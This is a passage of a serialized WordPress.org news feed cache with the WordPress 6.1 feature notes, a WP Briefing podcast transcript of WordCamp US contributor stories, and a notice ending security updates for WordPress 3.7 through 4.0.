href=\"https://make.wordpress.org/core/2022/07/21/core-editor-improvement-deeper-customization-with-more-template-options/\" target=\"_blank\">template options</a></li>\n\n\n\n<li>More intuitive document settings experience</li>\n\n\n\n<li>Header and footer patterns for all themes</li>\n\n\n\n<li>Improved quote and list blocks with inner block support</li>\n\n\n\n<li>More robust placeholders for various blocks</li>\n\n\n\n<li>New modal interfaces and preferences improvements</li>\n\n\n\n<li>Automatic navigation block selection with fallbacks and easier menu management</li>\n\n\n\n<li>Apply locking settings to all inner blocks in one click</li>\n\n\n\n<li>Improvements to the block theme discovery experience</li>\n\n\n\n<li>Accessibility updates, with more than 60 resolved tickets</li>\n\n\n\n<li>Performance updates, with more than 25 resolved tickets</li>\n</ul>\n\n\n\n<h3>For developers</h3>\n\n\n\n<ul>\n<li>Opt into appearance tools to make any theme more powerful</li>\n\n\n\n<li>New iteration on the style system</li>\n\n\n\n<li>Add starter patterns to any post type (<a rel=\"noreferrer noopener\" href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/#post-type-patterns\" target=\"_blank\">learn more</a>)</li>\n\n\n\n<li>Evolution of layout options including a new&nbsp;<code>constrained</code>&nbsp;option and the ability to disable layout options</li>\n\n\n\n<li>Content lock patterns for more curation options</li>\n\n\n\n<li>Expanded support for query loop blocks</li>\n\n\n\n<li>Allow the use of block-based template parts in classic themes (<a rel=\"noreferrer noopener\" href=\"https://make.wordpress.org/themes/2022/09/12/testing-and-feedback-for-using-block-based-template-parts-in-classic-themes/\" target=\"_blank\">give feedback</a>)</li>\n\n\n\n<li>Filter <code>theme.json</code> data (<a rel=\"noreferrer noopener\" href=\"https://developer.wordpress.org/block-editor/reference-guides/filters/global-styles-filters/\" target=\"_blank\">learn more</a>)</li>\n\n\n\n<li>Fluid typography allows for more responsiveness (<a rel=\"noreferrer noopener\" href=\"https://make.wordpress.org/themes/2022/08/15/testing-and-feedback-for-the-fluid-typography-feature/\" target=\"_blank\">give feedback</a>)</li>\n\n\n\n<li>Ability to style elements inside blocks like buttons, headings, or captions in <code>theme.json</code></li>\n</ul>\n\n\n\n<p><em>Please note that all features listed in this post are subject to change before the final releas</em>e.</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2>A Haiku for you</h2>\n\n\n\n<p>Twenty Twenty-Three<br>10 style variations<br>The new default theme</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>Thank you to the following contributors for collaborating on this post: <a href=\"https://profiles.wordpress.org/dansoschin/\">@dansoschin</a>,  <a href=\"https://profiles.wordpress.org/annezazu/\">@annezazu</a>, <a href=\"https://profiles.wordpress.org/cbringmann/\">@cbringmann</a>, <a href=\"https://profiles.wordpress.org/davidb/\">@davidbaumwald</a>, <a href=\"https://profiles.wordpress.org/priethor/\">@priethor</a>, and <a href=\"https://profiles.wordpress.org/jeffpaul/\">@jeffpaul</a>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13495\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:10;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:67:\"WP Briefing: Episode 39: Contributor Stories Live from WordCamp US!\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:88:\"https://wordpress.org/news/2022/09/episode-39-contributor-stories-live-from-wordcamp-us/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 19 Sep 2022 12:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13481\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:84:\"Live from WordCamp US 2022, listen to contributor stories about why they WordPress. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/09/WP-Briefing-039.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:13436:\"\n<p>In the thirty-ninth episode of the WordPress Briefing, hear contributors at WordCamp US share stories about their why for using WordPress and attending WordCamps. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/javiarce/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/javiarce/\">Javier Arce</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a> and <a href=\"https://profiles.wordpress.org/cbringmann/\">Chloé Bringmann</a><br>Song: Fearless First by Kevin MacLeod </p>\n\n\n\n<h2>Guests</h2>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/topher1kenobe/\">Topher DeRosia</a><br><a href=\"https://profiles.wordpress.org/jenblogs4u/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/jenblogs4u/\">Jen Miller</a><br><a href=\"https://wordpress.org/support/users/courane01/\" data-type=\"URL\" data-id=\"https://wordpress.org/support/users/courane01/\">Courtney Robertson</a><br><a href=\"https://profiles.wordpress.org/kdrewien/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/kdrewien/\">Kathy Drewien</a><br><a href=\"https://profiles.wordpress.org/alexstine/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/alexstine/\">Alex Stine</a><br><a href=\"https://profiles.wordpress.org/courtneypk/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/courtneypk/\">Courtney&nbsp;Patubo&nbsp;Kranzke</a><br><a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br><a href=\"https://www.linkedin.com/in/ri%C4%8Dardas-kudirka-3815a976/?originalSubdomain=lt\">Ricardas Kudirka</a></p>\n\n\n\n<h2>References</h2>\n\n\n\n<p><a href=\"https://make.wordpress.org/polyglots/2022/09/06/announcement-wordpress-translation-day-2022/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/polyglots/2022/09/06/announcement-wordpress-translation-day-2022/\">WordPress Translation Day September 28, 2022</a><br><a href=\"https://woosesh.com/\" data-type=\"URL\" data-id=\"https://woosesh.com/\">WooSesh October 11-13, 2022</a><br><a href=\"https://2022.allthingsopen.org/\" data-type=\"URL\" data-id=\"https://2022.allthingsopen.org/\">All Things Open October 30-November 2, 2022</a></p>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13481\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello, everyone! And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I’m your host, Josepha Haden Chomphosy.&nbsp;</p>\n\n\n\n<p>Here we go!</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:41]&nbsp;</strong></p>\n\n\n\n<p>For folks who are new to WordPress in the past couple of years, you may have heard people talk about WordPress events with a sort of passion that really is hard to describe. For me, I know our events are the dark matter of what makes this global, fully distributed, multifaceted project come together so well in the end.</p>\n\n\n\n<p>But I also know that WordPressers have so many different reasons for coming together. So we took a little wander through WordCamp US to get their take on why they use WordPress and also why they go to WordCamps.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:13]&nbsp;</strong></p>\n\n\n\n<p>So WordCamp US is back in person for the first time since 2019. What are you most excited about?</p>\n\n\n\n<p><strong>[Topher 00:01:19]&nbsp;</strong></p>\n\n\n\n<p>I am Topher.</p>\n\n\n\n<p>Seeing everyone, the interpersonal relationships, the communication, the expressions on people&#8217;s faces that you don&#8217;t get via email or Slack or whatever. Just being near people again and enjoying each other&#8217;s company.</p>\n\n\n\n<p><strong>[Jen Miller 00:01:35]&nbsp;</strong></p>\n\n\n\n<p>My name is Jen Miller.</p>\n\n\n\n<p>I was most excited to see my friends. It&#8217;s been a long time to try to maintain connections via social media and, you know, texting and phone calls. But being here and being a part of the WordPress community has made everything great.</p>\n\n\n\n<p><strong>[Courtney Robertson 00:01:54]&nbsp;</strong></p>\n\n\n\n<p>Courtney Robertson.</p>\n\n\n\n<p>Contributor day, of course, that&#8217;s how I got really connected to the WordPress community. And I am hoping we have a great turnout.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:02]&nbsp;</strong></p>\n\n\n\n<p>How long have you been a contributor to WordPress?</p>\n\n\n\n<p><strong>[Kathy Drewien 00:02:05]&nbsp;</strong></p>\n\n\n\n<p>Hi, I&#8217;m Kathy Drewien.</p>\n\n\n\n<p>I started in 2008 by attending my first WordCamp. Two years later, I was part of the organizing team for WordCamp Atlanta. I have been on that team for one role or another. Well, I can&#8217;t tell you how many years now. From then, until now.</p>\n\n\n\n<p><strong>[Alex Stine 00:02:24]&nbsp;</strong></p>\n\n\n\n<p>My name is Alex Stine. About six years now.</p>\n\n\n\n<p><strong>[Topher 00:02:28]&nbsp;</strong></p>\n\n\n\n<p>About 12 years.</p>\n\n\n\n<p>I started going to WordCamp, then working in the support forums, and just grew from there.</p>\n\n\n\n<p><strong>[Courtney Robertson 00:02:24]&nbsp;</strong></p>\n\n\n\n<p>I started checking guests in, at my first WordCamp in 2009, which I see as one avenue of contributing. I joined a team officially in 2014.&nbsp;</p>\n\n\n\n<p><strong>[</strong><strong>Courtney Patubo Kranzke </strong><strong>00:02:47]&nbsp;</strong></p>\n\n\n\n<p>My name is Courtney Patubo Kranzke.</p>\n\n\n\n<p>I have been an on-and-off contributor to WordPress since like the mid-2000s, but I&#8217;ve been a sponsored contributor since 2016.</p>\n\n\n\n<p><strong>[</strong><strong>Dustin Hartzler </strong><strong>00:03:02]&nbsp;</strong></p>\n\n\n\n<p>My name is Dustin Hartzler.</p>\n\n\n\n<p>I started a WordPress podcast in 2010. And I did like 500 episodes in a row without a break and without a week worth of rest. So I consider that my contribution to WordPress. I have a couple of core contributions, like I, I fixed a little bug here, a little bug there in a couple of releases, I think back in the four eras, 4.1 or 4.2 or something.</p>\n\n\n\n<p>2010 is when I really got started in giving back, and, like, sharing my knowledge with the WordPress community.</p>\n\n\n\n<p><strong>[</strong><strong>Josepha Haden Chomphosy </strong><strong>00:03:28]&nbsp;</strong></p>\n\n\n\n<p>Why is it important for you to attend WordCamps or contribute to the WordPress project?</p>\n\n\n\n<p><strong>[</strong><strong>Ricardas Kudirka </strong><strong>00:03:33]&nbsp;</strong></p>\n\n\n\n<p>My name is Ricardas Kudirka.</p>\n\n\n\n<p>Basically, for everyone who&#8217;s using WordPress, it&#8217;s really important to understand how big the community is that we have here. So the community is an important and crucial part of WordPress.</p>\n\n\n\n<p>And for it to grow, you need to attend the WordCamps, you need to share knowledge, and you need to meet people. So networking here and while meeting the exciting people who are developing WordPress or who are contributing to it, who are providing the services, who enable people to use WordPress.</p>\n\n\n\n<p>That&#8217;s a crucial point for everyone to attend.</p>\n\n\n\n<p><strong>[</strong><strong>Kathy Drewien </strong><strong>00:04:05]&nbsp;</strong></p>\n\n\n\n<p>It&#8217;s important to attend them because it&#8217;s very hard to describe them. We are not like any other thing you have ever done in your life. You have to be here to get it. And then once you get it, you wanna do more of it. It&#8217;s magical. It&#8217;s magical. There&#8217;s no way to get that experience without being here.</p>\n\n\n\n<p>In terms of contributing, it&#8217;s a responsible thing to do. You want to give back instead of get, get, get. In the beginning, we&#8217;re all about the get, get, get. And then you go, oh my gosh. I didn&#8217;t know. I didn&#8217;t know I could do this. I didn&#8217;t know I had to write code. I can actually just stand around and talk to people and contribute to the project.</p>\n\n\n\n<p><strong>[</strong><strong>Jen Miller </strong><strong>00:04:50]&nbsp;</strong></p>\n\n\n\n<p>Well, it&#8217;s a community effort, and so if we want it to progress and grow, we need to put our own individual effort into the community.</p>\n\n\n\n<p>Plus, we make friends, we make connections, and we find people who we can help and who can help us.</p>\n\n\n\n<p><strong>[</strong><strong>Alex Stine </strong><strong>00:05:07]</strong></p>\n\n\n\n<p>I feel it is important to support the community that got me my start in technology and make sure that people understand that accessibility is very much a requirement.</p>\n\n\n\n<p>You know, we need to make sure we keep the community inclusive for all.</p>\n\n\n\n<p><strong>[</strong><strong>Josepha Haden Chomphosy </strong><strong>00:05:21]</strong></p>\n\n\n\n<p>What is your favorite way to WordPress?</p>\n\n\n\n<p><strong>[</strong><strong>Courtney Patubo Kranzke </strong><strong>00:05:24]&nbsp;</strong></p>\n\n\n\n<p>I started with WordPress as a personal blogger. So it continues to be my favorite way to use WordPress. But, my use has evolved to using it for work as well as a place to share my photography and food blogging.</p>\n\n\n\n<p><strong>[</strong><strong>Courtney Robertson </strong><strong>00:05:42]&nbsp;</strong></p>\n\n\n\n<p>My favorite way to WordPress is through the Training team. Most of the things that I write these days are on make.wordpress.org/training and or learn.wordpress.org.</p>\n\n\n\n<p>I love teaching people about WordPress, helping people at all skill levels advance, and that&#8217;s where you&#8217;ll find me around the WordPress Training team.</p>\n\n\n\n<p><strong>[</strong><strong>Dustin&nbsp; Hartzler </strong><strong>00:05:59]&nbsp;</strong></p>\n\n\n\n<p>My favorite way to WordPress is just building cool things. Like I have a website, my wife has a couple of websites, and me just trying to learn things and trying to do them myself. Yesterday, there was a session, a 15-minute long session, and I learned how to customize the options available for different core WordPress blocks.</p>\n\n\n\n<p>I didn&#8217;t realize that you could just make a button and like make a default like here&#8217;s the style for the default button. So every button&#8217;s exactly the same on the site. Like how cool is that? I like the side of customizing WordPress to make it easier for people who are non-techy like me to use my site, like my wife, and whatnot.</p>\n\n\n\n<p><strong>[</strong><strong>Josepha Haden Chomphosy </strong><strong>00:06:30]&nbsp;</strong></p>\n\n\n\n<p>How do you use WordPress in your day-to-day life?</p>\n\n\n\n<p><strong>[</strong><strong>Topher </strong><strong>00:06:32]&nbsp;</strong></p>\n\n\n\n<p>It&#8217;s sort of a universal tool for me. I blog, and I do podcasts.</p>\n\n\n\n<p>I enjoy drinking whiskey, so I built a rating system for it. And I use it as a notepad, a scratch pad. I use it as my photography backup system. Just kind of as a universal tool for everything</p>\n\n\n\n<p><strong>[</strong><strong>Alex Stine </strong><strong>00:06:53]</strong></p>\n\n\n\n<p>So I currently am one of the Accessibility team reps.</p>\n\n\n\n<p>I&#8217;m a core contributor, Guttenberg contributor, the occasional meta contributor, and the occasional training team contributor.</p>\n\n\n\n<p><strong>[</strong><strong>Josepha Haden Chomphosy </strong><strong>00:07:05]</strong></p>\n\n\n\n<p>Well, if that doesn&#8217;t convince you to go to a WordCamp or start your own meetup group, I just don&#8217;t know what will. Big thanks to everyone who sat down with us there in San Diego.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:07:23]</strong></p>\n\n\n\n<p>And now it&#8217;s time for our small list of big things.</p>\n\n\n\n<p>First thing, WordPress Global Translation Day is coming up next week on September 28th. This is a great opportunity to learn more about the hard work that goes into translating all of this software for folks all around the world. If you want to learn more about how you could contribute to translations, I&#8217;ll have a link in the show notes for you.</p>\n\n\n\n<p>The second thing is that WooSesh is coming up on October 11th through 13th, 2022. This one is not an in-person event. It&#8217;s a WPSessions event, but it specifically talks about how to get some eCommerce going on your WordPress site. So if you&#8217;ve been thinking about how to get a shop on your site, or just making your current shop a bit more complicated, then this is the event for you.</p>\n\n\n\n<p>And the third thing on our list today is All Things Open. They are hosting a hybrid event this year from October 31st through November 2nd. This event isn&#8217;t specific to WordPress, but it is specific to open source and one of the best resources for learning some OSS basics. So if you&#8217;ve been interested in learning more about how this whole open source thing is an idea that will change our generation, then set your sights on that event. I will have a link in the show notes there as well.</p>\n\n\n\n<p>And that, my friends, is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13481\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:11;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:64:\"Dropping security updates for WordPress versions 3.7 through 4.0\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:100:\"https://wordpress.org/news/2022/09/dropping-security-updates-for-wordpress-versions-3-7-through-4-0/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Wed, 07 Sep 2022 13:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:8:\"Security\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:7:\"Updates\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13466\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:343:\"As of December 1, 2022 the WordPress Security Team will no longer provide security updates for WordPress versions 3.7 through 4.0. These versions of WordPress were first released eight or more years ago so the vast majority of WordPress installations run a more recent version of WordPress. The chances this will affect your site, or [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:12:\"Peter Wilson\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:2478:\"\n<p>As of December 1, 2022 the WordPress Security Team will no longer provide security updates for WordPress versions 3.7 through 4.0.</p>\n\n\n\n<p>These versions of WordPress were first released eight or more years ago so the vast majority of WordPress installations run a more recent version of WordPress. The chances this will affect your site, or sites, is very small.</p>\n\n\n\n<p>If you are unsure if you are running an up-to-date version of WordPress, please log in to your site’s dashboard. Out of date versions of WordPress will display a notice that looks like this:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" width=\"698\" height=\"81\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/09/update-notice.png?resize=698%2C81&#038;ssl=1\" alt=\"WordPress update notice: &quot;WordPress 6.0.2 is available! Pleaes update now.&quot;\" class=\"wp-image-13467\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/09/update-notice.png?w=698&amp;ssl=1 698w, https://i0.wp.com/wordpress.org/news/files/2022/09/update-notice.png?resize=300%2C35&amp;ssl=1 300w\" sizes=\"(max-width: 698px) 100vw, 698px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>In WordPress versions 3.8 &#8211; 4.0, the version you are running is displayed in the bottom of the “At a Glance” section of the dashboard. In WordPress 3.7 this section is titled “Right Now”.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"295\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/09/at-a-glance-widget.png?resize=1024%2C295&#038;ssl=1\" alt=\"&quot;At a Glance&quot; section of the WordPress dashboard. The final line includes the exact version of WordPress the site is running.\" class=\"wp-image-13468\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/09/at-a-glance-widget.png?resize=1024%2C295&amp;ssl=1 1024w, https://i1.wp.com/wordpress.org/news/files/2022/09/at-a-glance-widget.png?resize=300%2C86&amp;ssl=1 300w, https://i1.wp.com/wordpress.org/news/files/2022/09/at-a-glance-widget.png?resize=768%2C221&amp;ssl=1 768w, https://i1.wp.com/wordpress.org/news/files/2022/09/at-a-glance-widget.png?w=1208&amp;ssl=1 1208w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>The Make WordPress Security blog has further details about <a href=\"https://make.wordpress.org/security/2022/09/07/dropping-security-updates-for-wordpress-versions-3-7-through-4-0/\">the process to end support</a>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13466\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:12;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:38:\"The Month in WordPress – August 2022\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:70:\"https://wordpress.org/news/2022/09/the-month-in-wordpress-august-2022/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 05 Sep 2022 13:23:44 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:18:\"Month in WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:18:\"month in wordpress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13445\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:361:\"August has been a busy month, with the redesign of WordPress.org, new localized content on Learn WordPress, and the WordPress 6.0.2 security and maintenance release. But that&#8217;s not all! Read on to catch up on the latest WordPress news. WordPress 6.1 walk-through scheduled for September 13, 2022 Save the date! A live interactive walk-through of [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"rmartinezduque\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:15623:\"\n<p>August has been a busy month, with the redesign of WordPress.org, new localized content on Learn WordPress, and the WordPress 6.0.2 security and maintenance release. But that&#8217;s not all! Read on to catch up on the latest WordPress news.</p>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<h2>WordPress 6.1 walk-through scheduled for September 13, 2022</h2>\n\n\n\n<p>Save the date! A <strong>live interactive walk-through of WordPress 6.1 is coming up on September 13, 2022, at 16:00 UTC</strong>. The event will take place <a href=\"http://dotorgzoom.wordpress.com/\">via Zoom</a> and include a discussion of new major features, resolved tickets, and potential blockers.</p>\n\n\n\n<p>Attendance is open to anyone who wants to know more about what’s coming in the next major release. If you are unable to attend, the event will be recorded for on-demand viewing.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p><a href=\"https://make.wordpress.org/core/2022/09/05/6-1-product-walk-through/\">Learn more about the WordPress 6.1 product walk-through</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>The WordPress.org Homepage and Download page got a new jazz-inspired look</h2>\n\n\n\n<p>The <a href=\"https://wordpress.org/news/2022/08/a-new-wordpress-org-homepage-and-download-page/\">redesign of the WordPress.org homepage and download page</a> went live on August 15, 2022. The new pages highlight the benefits of using WordPress while making it easy to access resources for getting started. The look and feel build on the jazzy aesthetic that WordPress is known for.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"599\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?resize=1024%2C599&#038;ssl=1\" alt=\"WordPress.org homepage\" class=\"wp-image-13323\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/08/launch-featured.png?resize=1024%2C599&amp;ssl=1 1024w, 